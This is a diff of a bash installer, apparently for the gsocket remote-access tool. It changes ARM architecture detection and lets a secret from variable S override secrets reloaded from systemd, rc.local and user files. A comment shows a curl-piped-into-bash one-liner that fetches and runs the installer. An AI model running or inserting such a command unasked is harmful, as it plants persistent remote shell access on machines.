@@ -191,7 +191,7 @@ init_vars()
 		if [[ $OSTYPE == *linux* ]]; then 
 			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
 				OSARCH="i386-alpine"
-			elif [[ "$arch" == "armv6l" ]] || [[ "$arch" == "armv7l" ]]; then
+			elif [[ "$arch" == *"armv"* ]]; then
 				OSARCH="armv6l-linux" # RPI-Zero / RPI 4b+
 			elif [[ "$arch" == "aarch64" ]]; then
 				OSARCH="aarch64-linux"
@@ -981,19 +981,23 @@ init_setup
 # User supplied install-secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
-if [[ $UID -eq 0 ]]; then
-	gs_secret_reload "$SYSTEMD_SEC_FILE" 
-	gs_secret_reload "$RCLOCAL_SEC_FILE" 
-fi
-gs_secret_reload "$USER_SEC_FILE"
+if [[ -z $S ]]; then
+	if [[ $UID -eq 0 ]]; then
+		gs_secret_reload "$SYSTEMD_SEC_FILE" 
+		gs_secret_reload "$RCLOCAL_SEC_FILE" 
+	fi
+	gs_secret_reload "$USER_SEC_FILE"
 
-if [[ -n $GS_SECRET_FROM_FILE ]]; then
-	GS_SECRET="${GS_SECRET_FROM_FILE}"
+	if [[ -n $GS_SECRET_FROM_FILE ]]; then
+		GS_SECRET="${GS_SECRET_FROM_FILE}"
+	else
+		GS_SECRET="${GS_SECRET_X}"
+	fi
+
+	DEBUGF "GS_SECRET=$GS_SECRET"
 else
-	GS_SECRET="${GS_SECRET_X}"
+	GS_SECRET="$S"
 fi
-
-DEBUGF "GS_SECRET=$GS_SECRET"
 
 try "$OSARCH"
 [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
